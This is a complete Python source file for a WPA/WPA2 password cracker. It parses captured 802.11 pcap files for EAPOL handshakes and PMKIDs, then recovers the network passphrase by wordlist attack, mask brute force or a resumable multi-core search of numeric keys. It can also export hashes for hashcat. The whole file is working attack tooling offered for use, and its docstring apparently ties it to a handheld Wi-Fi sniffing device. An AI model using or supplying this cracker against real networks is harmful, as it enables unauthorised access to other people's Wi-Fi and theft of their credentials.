#!/usr/bin/env python3
"""WPA/WPA2 4-way-handshake (and PMKID) dictionary cracker — pure Python.

Reads a libpcap file with raw 802.11 frames (DLT_IEEE802_11 = 105, what the
device's sniffer writes to /BrucePCAP/handshakes/*.pcap; radiotap DLT 127 is
also accepted), extracts any WPA handshakes / PMKIDs, and runs a wordlist
attack offline.

Crypto (all stdlib hashlib + `cryptography` for AES-CMAC):
  PMK  = PBKDF2-HMAC-SHA1(passphrase, ssid, 4096, 32)
  PTK  = PRF-512(PMK, "Pairwise key expansion", min|max(AA,SPA)+min|max(ANonce,SNonce))
  KCK  = PTK[0:16]
  MIC  = { v1: HMAC-MD5 | v2: HMAC-SHA1-128 | v3: AES-128-CMAC }(KCK, eapol_frame_mic_zeroed)
  PMKID = HMAC-SHA1-128(PMK, "PMK Name" + AA + SPA)

  host/.venv/bin/python host/wpa_crack.py capture.pcap -w wordlist.txt [--ssid NAME]
"""
import hashlib
import hmac
import os
import struct
import sys
from dataclasses import dataclass, field

try:
    from cryptography.hazmat.primitives.cmac import CMAC
    from cryptography.hazmat.primitives.ciphers import algorithms
    _HAVE_CMAC = True
except Exception:  # noqa: BLE001
    _HAVE_CMAC = False

EAPOL_LLC = bytes.fromhex("aaaa03000000888e")  # LLC/SNAP for 802.1X/EAPOL


# ── crypto ───────────────────────────────────────────────────────────────────
def pmk(passphrase: str, ssid: str) -> bytes:
    return hashlib.pbkdf2_hmac("sha1", passphrase.encode(), ssid.encode(), 4096, 32)


def _prf512(key: bytes, label: bytes, data: bytes) -> bytes:
    """IEEE 802.11 PRF-512 (HMAC-SHA1) — produces the 64-byte PTK; we use 48."""
    out = b""
    i = 0
    while len(out) < 64:
        out += hmac.new(key, label + b"\x00" + data + bytes([i]), hashlib.sha1).digest()
        i += 1
    return out[:64]


def ptk(pmk_: bytes, aa: bytes, spa: bytes, anonce: bytes, snonce: bytes) -> bytes:
    data = min(aa, spa) + max(aa, spa) + min(anonce, snonce) + max(anonce, snonce)
    return _prf512(pmk_, b"Pairwise key expansion", data)


def mic(kck: bytes, eapol: bytes, key_version: int) -> bytes:
    if key_version == 1:
        return hmac.new(kck, eapol, hashlib.md5).digest()[:16]
    if key_version == 2:
        return hmac.new(kck, eapol, hashlib.sha1).digest()[:16]
    if key_version == 3:
        if not _HAVE_CMAC:
            raise RuntimeError("AES-CMAC (key version 3) needs the 'cryptography' package")
        c = CMAC(algorithms.AES(kck))
        c.update(eapol)
        return c.finalize()[:16]
    raise ValueError(f"unsupported key descriptor version {key_version}")


def pmkid(pmk_: bytes, aa: bytes, spa: bytes) -> bytes:
    return hmac.new(pmk_, b"PMK Name" + aa + spa, hashlib.sha1).digest()[:16]


# ── handshake model ────────────────────────────────────────────────────────────
@dataclass
class Handshake:
    ssid: str = ""
    ap: bytes = b""          # AA  (BSSID / authenticator)
    sta: bytes = b""         # SPA (supplicant)
    anonce: bytes = b""
    snonce: bytes = b""
    key_version: int = 2
    eapol: bytes = b""       # the MIC-bearing EAPOL frame, MIC field zeroed
    captured_mic: bytes = b""
    pmkid: bytes = b""       # set if a PMKID KDE was seen (msg1)
    msgs: set = field(default_factory=set)

    def crackable(self) -> bool:
        if self.pmkid and self.ssid:
            return True
        return bool(self.ssid and self.anonce and self.snonce
                    and self.eapol and self.captured_mic)

    def verify(self, passphrase: str) -> bool:
        if not (8 <= len(passphrase) <= 63):
            return False
        p = pmk(passphrase, self.ssid)
        if self.pmkid:
            if pmkid(p, self.ap, self.sta) == self.pmkid:
                return True
            if not self.crackable() or not self.eapol:
                return False
        t = ptk(p, self.ap, self.sta, self.anonce, self.snonce)
        return mic(t[:16], self.eapol, self.key_version) == self.captured_mic

    def label(self) -> str:
        ap = self.ap.hex(":") if self.ap else "?"
        kind = "PMKID" if self.pmkid and not self.captured_mic else "EAPOL"
        return f"{self.ssid or '<unknown>'} [{ap}] {kind} msgs={sorted(self.msgs)}"


# ── pcap + 802.11 + EAPOL parsing ──────────────────────────────────────────────
def read_pcap(path: str):
    """Yield raw link-layer frames (802.11 MAC frames). Handles DLT 105 (raw
    802.11) and 127 (radiotap — header stripped)."""
    with open(path, "rb") as fh:
        gh = fh.read(24)
        if len(gh) < 24:
            return
        magic = gh[:4]
        if magic in (b"\xd4\xc3\xb2\xa1", b"\xa1\xb2\xc3\xd4"):
            le = magic == b"\xd4\xc3\xb2\xa1"
        else:
            raise ValueError("not a libpcap file (bad magic) — pcapng is unsupported")
        end = "<" if le else ">"
        dlt = struct.unpack(end + "I", gh[20:24])[0]
        while True:
            rh = fh.read(16)
            if len(rh) < 16:
                return
            _, _, incl, _orig = struct.unpack(end + "IIII", rh)
            data = fh.read(incl)
            if len(data) < incl:
                return
            if dlt == 127:  # radiotap: it_len is u16 LE at offset 2
                if len(data) < 4:
                    continue
                itlen = struct.unpack("<H", data[2:4])[0]
                data = data[itlen:]
            yield data


def _mac(b: bytes) -> bytes:
    return bytes(b)


def parse(path: str):
    """Parse a pcap into {(ap,sta): Handshake} keyed handshakes, filling SSIDs
    from beacons/probe-responses."""
    ssids = {}                       # bssid -> ssid
    hs = {}                          # (ap, sta) -> Handshake

    def get_hs(ap, sta):
        k = (ap, sta)
        if k not in hs:
            hs[k] = Handshake(ap=ap, sta=sta)
        return hs[k]

    for fr in read_pcap(path):
        if len(fr) < 24:
            continue
        fc = fr[0] | (fr[1] << 8)
        ftype = (fc >> 2) & 3
        subtype = (fc >> 4) & 0xF
        tods = (fc >> 8) & 1
        fromds = (fc >> 9) & 1
        addr1, addr2, addr3 = _mac(fr[4:10]), _mac(fr[10:16]), _mac(fr[16:22])

        # management beacon (8) / probe response (5): grab SSID for the BSSID
        if ftype == 0 and subtype in (8, 5):
            bssid = addr3
            body = fr[24 + 12:]  # skip mgmt header + (timestamp8 interval2 caps2)
            i = 0
            while i + 2 <= len(body):
                tag, tlen = body[i], body[i + 1]
                if tag == 0 and i + 2 + tlen <= len(body):
                    try:
                        s = body[i + 2:i + 2 + tlen].decode("utf-8", "replace")
                    except Exception:  # noqa: BLE001
                        s = ""
                    if s:
                        ssids[bssid] = s
                    break
                i += 2 + tlen
            continue

        # data frames only for EAPOL
        if ftype != 2:
            continue
        off = 24
        if subtype & 0x08:  # QoS data has a 2-byte QoS Control field
            off += 2
        if fromds and tods:  # WDS has a 4th address — rare; skip
            off += 6
        if len(fr) < off + 8 or fr[off:off + 8] != EAPOL_LLC:
            continue
        # direction → AP (authenticator) / STA (supplicant)
        if tods and not fromds:        # STA -> AP
            ap, sta = addr1, addr2
        elif fromds and not tods:      # AP -> STA
            ap, sta = addr2, addr1
        else:
            ap, sta = addr3, addr2

        e = fr[off + 8:]               # EAPOL frame starts here
        if len(e) < 4 or e[1] != 3:    # type 3 = EAPOL-Key
            continue
        eapol_len = struct.unpack(">H", e[2:4])[0]
        frame = e[:4 + eapol_len]
        if len(frame) < 95:
            continue
        key_info = struct.unpack(">H", frame[5:7])[0]
        key_ver = key_info & 0x7
        pairwise = (key_info >> 3) & 1
        install = (key_info >> 6) & 1
        ack = (key_info >> 7) & 1
        mic_set = (key_info >> 8) & 1
        if not pairwise:
            continue
        nonce = frame[17:49]
        captured_mic = frame[81:97]
        key_data_len = struct.unpack(">H", frame[97:99])[0]
        key_data = frame[99:99 + key_data_len]

        h = get_hs(ap, sta)
        # classify
        if ack and not mic_set:        # msg1 (AP→STA): ANonce, maybe PMKID KDE
            h.anonce = nonce
            h.msgs.add(1)
            pid = _extract_pmkid(key_data)
            if pid:
                h.pmkid = pid
        elif mic_set and not ack:      # msg2 (STA→AP): SNonce + MIC; or msg4
            if int.from_bytes(nonce, "big") != 0:
                h.snonce = nonce
                h.msgs.add(2)
                # zero the MIC field for verification
                z = bytearray(frame)
                z[81:97] = b"\x00" * 16
                h.eapol = bytes(z)
                h.captured_mic = captured_mic
                h.key_version = key_ver
            else:
                h.msgs.add(4)
        elif mic_set and ack and install:  # msg3 (AP→STA): ANonce again
            h.anonce = nonce
            h.msgs.add(3)
        h.ssid = ssids.get(ap, h.ssid)

    return ssids, list(hs.values())


def _extract_pmkid(key_data: bytes):
    """Find a PMKID KDE inside msg1 key-data (RSN, OUI 00-0F-AC type 04)."""
    i = 0
    while i + 2 <= len(key_data):
        if key_data[i] == 0xDD:  # vendor-specific IE
            ln = key_data[i + 1]
            ie = key_data[i + 2:i + 2 + ln]
            if len(ie) >= 4 and ie[:4] == bytes.fromhex("000fac04") and len(ie) >= 20:
                pid = ie[4:20]
                if pid != b"\x00" * 16:
                    return pid
            i += 2 + ln
        else:
            i += 1
    return None


# ── cracking ────────────────────────────────────────────────────────────────
def crack(hsk: Handshake, words, progress=None):
    """Try each passphrase in `words` (iterable of str). Returns the passphrase
    or None. Calls progress(n) every 500 tries if given."""
    n = 0
    for w in words:
        w = w.rstrip("\r\n")
        n += 1
        if progress and n % 500 == 0:
            progress(n)
        try:
            if hsk.verify(w):
                return w
        except Exception:  # noqa: BLE001
            continue
    return None


_MASK_SETS = {
    "d": "0123456789",
    "l": "abcdefghijklmnopqrstuvwxyz",
    "u": "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "s": "!@#$%^&*()-_=+",
    "a": "".join(chr(c) for c in range(32, 127)),
}


def _parse_mask(mask: str):
    """Parse a hashcat-style mask into a list of charsets. ?d ?l ?u ?s ?a are
    classes; any other char is a literal. Returns [charset_str, ...]."""
    sets = []
    i = 0
    while i < len(mask):
        if mask[i] == "?" and i + 1 < len(mask):
            sets.append(_MASK_SETS.get(mask[i + 1], mask[i + 1]))
            i += 2
        else:
            sets.append(mask[i])
            i += 1
    return sets


def mask_keyspace(mask: str) -> int:
    n = 1
    for s in _parse_mask(mask):
        n *= len(s)
    return n


def mask_candidates(mask: str, limit: int = 0):
    """Yield every string matching the mask (odometer order). `limit` caps the
    count (0 = no cap). WPA needs 8..63 chars; shorter masks yield nothing."""
    import itertools
    sets = _parse_mask(mask)
    if not (8 <= len(sets) <= 63):
        return
    n = 0
    for combo in itertools.product(*sets):
        yield "".join(combo)
        n += 1
        if limit and n >= limit:
            return


def hc22000(h: "Handshake") -> str:
    """Export a captured EAPOL handshake as a hashcat 22000 (WPA*02) line, so a
    fast cracker (hashcat/aircrack-ng) can brute the full keyspace. The EAPOL
    field is the MIC-bearing frame with the MIC zeroed (as h.eapol already is)."""
    if not (h.captured_mic and h.anonce and h.eapol and h.ssid):
        return ""
    return "*".join([
        "WPA", "02",
        h.captured_mic.hex(),
        h.ap.hex(),
        h.sta.hex(),
        h.ssid.encode().hex(),
        h.anonce.hex(),
        h.eapol.hex(),
        "00",  # message pair: M1(ANonce)+M2(SNonce,MIC)
    ])


def export_hc22000(pcap_path: str, out_path: str, ssid_override: str = "") -> int:
    """Write every crackable EAPOL handshake in a pcap as hashcat 22000 lines.
    Returns the number written."""
    _ssids, hss = parse(pcap_path)
    if ssid_override:
        for h in hss:
            h.ssid = ssid_override
    n = 0
    with open(out_path, "w") as fh:
        for h in hss:
            line = hc22000(h)
            if line:
                fh.write(line + "\n")
                n += 1
    return n


# ── multiprocessing brute (PBKDF2 is the bottleneck; scale across cores) ───────
_MP_TARGET = None


def _mp_init(target):
    global _MP_TARGET
    _MP_TARGET = target


def _mp_check(batch):
    for w in batch:
        if _MP_TARGET.verify(w):
            return w
    return None


def _chunked(it, size):
    buf = []
    for x in it:
        buf.append(x)
        if len(buf) >= size:
            yield buf
            buf = []
    if buf:
        yield buf


def brute_mp(target, candidates, processes=0, chunk=256, progress=None):
    """Brute `target` over an iterable of candidate strings using a process pool.
    Returns (key|None, tried). progress(tried) is called per finished chunk."""
    import multiprocessing as mp
    if processes <= 0:
        processes = max(1, (os.cpu_count() or 1))
    tried = 0
    with mp.Pool(processes, initializer=_mp_init, initargs=(target,)) as pool:
        for res in pool.imap_unordered(_mp_check, _chunked(candidates, chunk)):
            tried += chunk
            if progress:
                progress(tried)
            if res is not None:
                pool.terminate()
                return res, tried
    return None, tried


def brute_digits_file(pcap_path, length=8, ssid_override="", processes=0,
                      checkpoint="", slice_size=1_000_000, progress=None, log=None):
    """Full resumable numeric brute: try every `length`-digit string against the
    pcap's handshake, multi-core, in slices. `checkpoint` persists the next index
    so a killed run resumes. Returns dict(ok, key, tried, keyspace)."""
    target, _ = select_target(pcap_path, ssid_override)
    if not target:
        return {"ok": False, "key": None, "error": "no crackable handshake"}
    keyspace = 10 ** length
    start = 0
    if checkpoint and os.path.isfile(checkpoint):
        try:
            start = int(open(checkpoint).read().strip() or "0")
        except Exception:  # noqa: BLE001
            start = 0
    fmt = "%0" + str(length) + "d"
    i = start
    while i < keyspace:
        hi = min(i + slice_size, keyspace)
        gen = (fmt % n for n in range(i, hi))
        key, _tried = brute_mp(target, gen, processes=processes, chunk=512,
                               progress=(lambda t, base=i: progress(base + t)) if progress else None)
        if key is not None:
            if log:
                log(f"KEY FOUND: {key}")
            return {"ok": True, "key": key, "tried": i, "keyspace": keyspace}
        i = hi
        if checkpoint:
            with open(checkpoint, "w") as fh:
                fh.write(str(i))
        if log:
            log(f"checkpoint {i:,}/{keyspace:,} ({100*i/keyspace:.2f}%)")
    return {"ok": False, "key": None, "tried": keyspace, "keyspace": keyspace}


def select_target(pcap_path: str, ssid_override: str = ""):
    """Parse a pcap and return (best_crackable_handshake | None, all_crackable)."""
    _ssids, hss = parse(pcap_path)
    if ssid_override:
        for h in hss:
            h.ssid = ssid_override
    crackable = [h for h in hss if h.crackable()]
    # prefer a full EAPOL handshake over PMKID-only
    crackable.sort(key=lambda h: (bool(h.captured_mic), bool(h.anonce and h.snonce)), reverse=True)
    return (crackable[0] if crackable else None), crackable


def crack_file(pcap_path: str, wordlist_path: str, ssid_override: str = "", progress=None):
    """High-level: parse a pcap, pick the best crackable handshake, run the
    wordlist. Returns dict(ok, key, handshake-label, tried, candidates)."""
    target, crackable = select_target(pcap_path, ssid_override)
    if not target:
        return {"ok": False, "key": None, "error": "no crackable handshake/PMKID found",
                "candidates": []}
    tried = [0]

    def words():
        with open(wordlist_path, "r", errors="ignore") as fh:
            for line in fh:
                tried[0] += 1
                yield line

    key = crack(target, words(), progress)
    return {"ok": key is not None, "key": key, "handshake": target.label(),
            "tried": tried[0], "candidates": [h.label() for h in crackable]}


def brute_file(pcap_path: str, mask: str, ssid_override: str = "", limit: int = 0, progress=None):
    """Brute-force a handshake against a hashcat-style mask (e.g. '?d?d?d?d?d?d?d?d'
    = all 8-digit PINs). Pure-Python PBKDF2 is slow (~1-3k/s), so bound big
    keyspaces with `limit`. Returns dict(ok, key, handshake, tried, keyspace)."""
    target, crackable = select_target(pcap_path, ssid_override)
    if not target:
        return {"ok": False, "key": None, "error": "no crackable handshake/PMKID found"}
    ks = mask_keyspace(mask)
    tried = [0]

    def gen():
        for c in mask_candidates(mask, limit):
            tried[0] += 1
            yield c

    key = crack(target, gen(), progress)
    return {"ok": key is not None, "key": key, "handshake": target.label(),
            "tried": tried[0], "keyspace": ks, "candidates": [h.label() for h in crackable]}


def main(argv=None):
    import argparse
    ap = argparse.ArgumentParser(description="WPA/WPA2 handshake/PMKID dictionary cracker")
    ap.add_argument("pcap", help="libpcap file with 802.11 frames (DLT 105 or radiotap)")
    ap.add_argument("-w", "--wordlist", help="wordlist file (dictionary attack)")
    ap.add_argument("--mask", help="brute-force mask, e.g. ?d?d?d?d?d?d?d?d (8 digits)")
    ap.add_argument("--limit", type=int, default=0, help="cap brute candidates (0 = no cap)")
    ap.add_argument("--ssid", default="", help="override/supply the SSID (if no beacon captured)")
    ap.add_argument("--list", action="store_true", help="only list handshakes found, don't crack")
    args = ap.parse_args(argv)

    ssids, hss = parse(args.pcap)
    print(f"SSIDs seen: {', '.join(sorted(set(ssids.values()))) or '(none)'}")
    print(f"handshakes: {len(hss)}")
    for h in hss:
        if args.ssid:
            h.ssid = args.ssid
        print(f"  - {h.label()}  crackable={h.crackable()}")
    if args.list:
        return 0
    if not args.wordlist and not args.mask:
        print("give -w/--wordlist and/or --mask")
        return 2

    def prog(n):
        print(f"  …tried {n}", end="\r", file=sys.stderr)

    res = None
    if args.wordlist:
        res = crack_file(args.pcap, args.wordlist, args.ssid, prog)
    if (not res or not res["ok"]) and args.mask:
        print(f"\nwordlist {'exhausted' if res else 'skipped'}; brute mask {args.mask} "
              f"(keyspace {mask_keyspace(args.mask):,})…")
        res = brute_file(args.pcap, args.mask, args.ssid, args.limit, prog)
    print()
    if res["ok"]:
        print(f"\n[KEY FOUND] {res['handshake']}\n  passphrase: {res['key']}  (after {res['tried']} tries)")
        return 0
    print(f"\n[not found] {res.get('error', 'exhausted wordlist')} "
          f"(tried {res.get('tried', 0)})")
    return 1


if __name__ == "__main__":
    sys.exit(main())
